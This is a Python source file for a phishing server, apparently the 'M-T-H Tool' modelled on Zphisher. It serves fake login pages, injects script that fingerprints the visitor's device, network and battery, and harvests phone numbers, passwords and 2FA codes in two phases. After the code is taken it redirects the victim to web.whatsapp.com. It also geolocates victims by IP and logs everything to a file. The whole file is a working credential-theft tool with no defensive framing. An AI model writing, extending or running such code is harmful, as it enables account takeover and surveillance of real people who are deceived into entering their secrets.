import http.server
import socketserver
import os
import sys
from datetime import datetime
import urllib.parse
import json
import io

# Global variable to store login data
login_data = []

# Color codes for terminal output
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def get_local_ip():
    """Gets the local IP address of the machine."""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def find_html_files(directory="."):
    """Finds all HTML files in the specified directory."""
    return sorted([f for f in os.listdir(directory) if f.endswith(('.html', '.htm'))])

def select_file(files):
    """Displays a menu for the user to select an HTML file to serve."""
    print(f"\n{colors.CYAN}[--] Available HTML files:{colors.END}")
    for i, file in enumerate(files, 1):
        print(f"[{i:02d}] {file}")
    
    while True:
        try:
            choice = input(f"\n[--] Select an option : ")
            if choice.lower() == 'q':
                return None
            if 1 <= int(choice) <= len(files):
                return files[int(choice) - 1]
        except (ValueError, IndexError):
            pass
        print(f"{colors.RED}[!] Invalid input. Please enter a number from the list.{colors.END}")

def save_login_data():
    """Saves all captured session data to a timestamped .txt file."""
    if not login_data:
        return
    
    filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("LOGIN & 2FA DATA CAPTURED\n" + "=" * 50 + "\n\n")
        for i, data in enumerate(login_data, 1):
            f.write(f"ENTRY #{i} ({data.get('type', 'N/A')})\n")
            f.write(f"Time: {data['time']}\n")
            f.write(f"IP Address: {data['ip']}\n")
            if data.get('location'):
                f.write(f"Location: {data['location']}\n")
            if data.get('username'):
                f.write(f"Phone Number: {data['username']}\n")
            if data.get('password'):
                f.write(f"Password: {data['password']}\n")
            if data.get('2fa_code'):
                f.write(f"2FA Code: {data['2fa_code']}\n")
            
            device_info = data.get('device_info', {})
            if device_info and device_info != 'Not available':
                f.write(f"\n--- Device & Network Info ---\n")
                f.write(f"Platform: {device_info.get('platform', 'N/A')}\n")
                f.write(f"Screen Resolution: {device_info.get('res', 'N/A')}\n")
                f.write(f"User Agent: {device_info.get('ua', 'N/A')}\n")
                f.write(f"Network Type: {device_info.get('net_type', 'Not available')}\n")
                f.write(f"Effective Network: {device_info.get('net_effective', 'N/A')}\n")
                f.write(f"Downlink Speed: {device_info.get('net_downlink', 'N/A')}\n")
                if device_info.get('battery_level'):
                    f.write(f"Battery Level: {device_info.get('battery_level', 'N/A')}\n")
                    f.write(f"Battery Charging: {device_info.get('battery_charging', 'N/A')}\n")
            f.write("-" * 50 + "\n\n")
    
    print(f"\n{colors.GREEN}[✓] Success! All data has been saved to {colors.BOLD}{filename}{colors.END}")

def get_location_from_ip(ip_address):
    """Get location from IP address using free API"""
    import requests
    try:
        # Skip local IP addresses
        if ip_address.startswith(('192.168.', '10.', '127.', '172.')):
            return "Local Network (Your WiFi)"
        
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        data = response.json()
        
        if data['status'] == 'success':
            city = data.get('city', 'Unknown City')
            country = data.get('country', 'Unknown Country')
            isp = data.get('isp', 'Unknown ISP')
            return f"{city}, {country} - {isp}"
        else:
            return "Location: Unknown"
    except Exception:
        return "Location: Service Offline"

def display_login_attempts():
    """Clears the screen and displays all captured login attempts."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    safe_filename = urllib.parse.quote(selected_file_name)
    
    print(f"{colors.GREEN}[✓] Serving '{selected_file_name}'{colors.END}")
    print(f"{colors.YELLOW}[::] Share the full link below:{colors.END}")
    print(f"{colors.CYAN}[01] Local URL  :{colors.END} http://localhost:{PORT}/{safe_filename}")
    print(f"{colors.CYAN}[02] Network URL:{colors.END} http://{LOCAL_IP}:{PORT}/{safe_filename}\n")
    
    if not login_data:
        print(f"{colors.CYAN}[--] Waiting for login attempts...{colors.END}")
        return
    
    print(f"{colors.PURPLE}{'='*80}{colors.END}")
    print(f"{colors.BOLD}{colors.CYAN}{'LOGIN ATTEMPTS':^80}{colors.END}")
    print(f"{colors.PURPLE}{'='*80}{colors.END}")
    
    for i, data in enumerate(login_data, 1):
        print(f"{colors.YELLOW}[{i:02d}] ATTEMPT #{i} ({colors.BOLD}{data.get('type', 'N/A')}{colors.END}{colors.YELLOW}){colors.END}")
        print(f"{colors.GREEN}[+] Time:{colors.END} {data['time']}")
        print(f"{colors.GREEN}[+] IP:{colors.END} {data['ip']}")
        
        # Show location if available
        if data.get('location'):
            print(f"{colors.BLUE}[+] 📍 {data['location']}{colors.END}")
        
        if data.get('username'):
            print(f"{colors.GREEN}[+] Phone Number:{colors.END} {data['username']}")
        if data.get('password'):
            print(f"{colors.GREEN}[+] Password:{colors.END} {data['password']}")
        if data.get('2fa_code'):
            print(f"{colors.BOLD}{colors.RED}[+] 2FA Code:{colors.END} {data['2fa_code']}")
        
        device_info = data.get('device_info', {})
        print(f"{colors.CYAN}[+] --- Device & Network Info ---{colors.END}")
        
        if device_info and device_info != 'Not available' and not device_info.get('error'):
            print(f"{colors.GREEN}[+] Platform:{colors.END} {device_info.get('platform', 'N/A')}")
            print(f"{colors.GREEN}[+] Screen:{colors.END} {device_info.get('res', 'N/A')}")
            
            # Network information
            net_type = device_info.get('net_type', 'Not available')
            net_effective = device_info.get('net_effective', 'N/A')
            net_downlink = device_info.get('net_downlink', 'N/A')
            
            print(f"{colors.GREEN}[+] Network Type:{colors.END} {net_type}")
            print(f"{colors.GREEN}[+] Effective Network:{colors.END} {net_effective}")
            print(f"{colors.GREEN}[+] Downlink Speed:{colors.END} {net_downlink}")
            
            # Battery information
            battery_level = device_info.get('battery_level', 'Not available')
            battery_charging = device_info.get('battery_charging', 'Not available')
            
            # Show battery with emoji based on level
            if battery_level and battery_level != 'Not available' and battery_level != 'Chrome: Try Firefox' and 'Not supported' not in battery_level:
                try:
                    if '%' in battery_level:
                        battery_percent = int(battery_level.replace('%', '').split(' ')[0])
                        battery_emoji = "🔋" if battery_charging == 'false' else "⚡"
                        battery_color = colors.GREEN if battery_percent > 50 else colors.YELLOW if battery_percent > 20 else colors.RED
                        charging_status = 'Charging' if battery_charging == 'true' else 'Not Charging'
                        print(f"{colors.GREEN}[+] Battery:{colors.END} {battery_color}{battery_emoji} {battery_level} ({charging_status}){colors.END}")
                    else:
                        print(f"{colors.GREEN}[+] Battery:{colors.END} {battery_level}")
                except:
                    print(f"{colors.GREEN}[+] Battery:{colors.END} {battery_level}")
            else:
                print(f"{colors.GREEN}[+] Battery:{colors.END} {battery_level}")
            
            # Show User Agent if available
            if device_info.get('ua'):
                print(f"{colors.GREEN}[+] User Agent:{colors.END} {device_info.get('ua', 'N/A')[:80]}...")
        else:
            print(f"{colors.RED}[!] Device info not collected - User may have JavaScript disabled{colors.END}")
        
        print(f"{colors.PURPLE}{'-'*40}{colors.END}")

def print_banner():
    """Prints the tool's banner in Zphisher style."""
    banner = f"""
{colors.BOLD}{colors.RED}
✿♥‿♥✿ M-T-H Tool ✿♥‿♥✿
{colors.END}
{colors.BOLD}{colors.CYAN}    Version : 2.2{colors.END}
{colors.BOLD}{colors.YELLOW}    Tool Created by M-T-H{colors.END}
{colors.RED}{'='*70}{colors.END}
"""
    print(banner)

def inject_device_script(html_content):
    """Injects JS into the HTML to collect device and network info."""
    script = """
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Create hidden field for device info
    let deviceField = document.getElementById('deviceInfo');
    if (!deviceField) {
        deviceField = document.createElement('input');
        deviceField.type = 'hidden';
        deviceField.name = 'deviceInfo';
        deviceField.id = 'deviceInfo';
        
        // Try to find the best place to put the hidden field
        const form = document.querySelector('form');
        if (form) {
            form.appendChild(deviceField);
        } else {
            document.body.appendChild(deviceField);
        }
    }
    
    // Collect device information
    const deviceInfo = {
        ua: navigator.userAgent || 'Unknown',
        platform: navigator.platform || 'Unknown',
        res: window.screen.width + 'x' + window.screen.height
    };
    
    // Collect network information
    if (navigator.connection) {
        deviceInfo.net_type = navigator.connection.type || 'unknown';
        deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
        deviceInfo.net_downlink = (navigator.connection.downlink || '0') + ' Mbps';
    } else {
        deviceInfo.net_type = 'Not available';
        deviceInfo.net_effective = 'N/A';
        deviceInfo.net_downlink = 'N/A';
    }
    
    // Set initial device info
    let initialDeviceInfo = JSON.stringify(deviceInfo);
    deviceField.value = initialDeviceInfo;
    
    // Add device info to all forms
    document.querySelectorAll('form').forEach(form => {
        if (!form.querySelector('#deviceInfo')) {
            const newDeviceField = deviceField.cloneNode();
            form.appendChild(newDeviceField);
            newDeviceField.value = initialDeviceInfo;
        }
    });
});
</script>
"""
    
    if 'deviceInfo' in html_content and 'navigator.userAgent' in html_content:
        return html_content
    
    if '</body>' in html_content:
        return html_content.replace('</body>', script + '\n</body>')
    else:
        return html_content + script

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            redirect_path = urllib.parse.quote(selected_file_name)
            self.send_response(301)
            self.send_header('Location', f'/{redirect_path}')
            self.end_headers()
            return
        return super().do_GET()

    def send_head(self):
        path = self.translate_path(self.path)
        if path.endswith(('.html', '.htm')):
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Always inject device script for all HTML files
                modified_content = inject_device_script(content).encode('utf-8')
                
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(modified_content)))
                self.end_headers()
                return io.BytesIO(modified_content)
            except Exception as e:
                print(f"{colors.RED}[!] Error processing HTML file: {e}{colors.END}")
                return None
        return super().send_head()

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = urllib.parse.parse_qs(post_data)
            
            # Extract data from different field names used in various HTML files
            username = data.get('email', [''])[0] or data.get('username', [''])[0] or data.get('phone', [''])[0]
            password = data.get('pass', [''])[0] or data.get('password', [''])[0]
            two_factor_code = data.get('2fa_code', [''])[0]
            device_info = {}
            
            try:
                device_info_str = data.get('deviceInfo', ['{}'])[0]
                device_info = json.loads(device_info_str)
            except (json.JSONDecodeError, KeyError):
                device_info = {"error": "Could not parse device info"}
            
            # Get location from IP
            location = get_location_from_ip(self.client_address[0])
            
            login_info = {
                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': self.client_address[0],
                'username': username,
                'device_info': device_info,
                'location': location
            }
            
            if password:
                login_info.update({'type': "Phase 1: Credentials", 'password': password})
                self.send_response(200)
                self.end_headers()
            elif two_factor_code:
                login_info.update({'type': "Phase 2: 2FA Code", '2fa_code': two_factor_code})
                self.send_response(303)
                self.send_header('Location', 'https://web.whatsapp.com')
                self.end_headers()
            else:
                self.send_response(200)
                self.end_headers()
                return
            
            if password or two_factor_code:
                login_data.append(login_info)
                display_login_attempts()
                
        except Exception as e:
            print(f"{colors.RED}[!] An error occurred in POST request: {e}{colors.END}")
            self.send_response(200)
            self.end_headers()

# --- Main execution block ---
selected_file_name, LOCAL_IP, PORT = None, "127.0.0.1", 8000

def run_server(file_path, port=8000):
    global LOCAL_IP, PORT, selected_file_name
    try:
        os.chdir(os.path.dirname(os.path.abspath(file_path)))
    except FileNotFoundError:
        print(f"{colors.RED}[!] Error: Directory for '{file_path}' not found.{colors.END}")
        return
    
    LOCAL_IP, PORT, selected_file_name = get_local_ip(), port, os.path.basename(file_path)
    display_login_attempts()
    
    try:
        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"\n{colors.GREEN}[✓] Server started successfully!{colors.END}")
            print(f"{colors.YELLOW}[::] Press Ctrl+C to stop the server{colors.END}")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n{colors.YELLOW}[!] Server stopped by user.{colors.END}")
        save_login_data()
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"{colors.YELLOW}[!] Port {PORT} is busy, trying port {port + 1}{colors.END}")
            run_server(file_path, port + 1)
        else:
            print(f"{colors.RED}[!] Server error: {e}{colors.END}")

def main():
    print_banner()
    script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in locals() else "."
    html_files = find_html_files(script_dir)
    
    if not html_files:
        print(f"{colors.RED}[!] No HTML files found.{colors.END}")
        return
    
    global selected_file_name
    selected_file_name = select_file(html_files)
    
    if selected_file_name:
        run_server(selected_file_name)

if __name__ == "__main__":
    main()
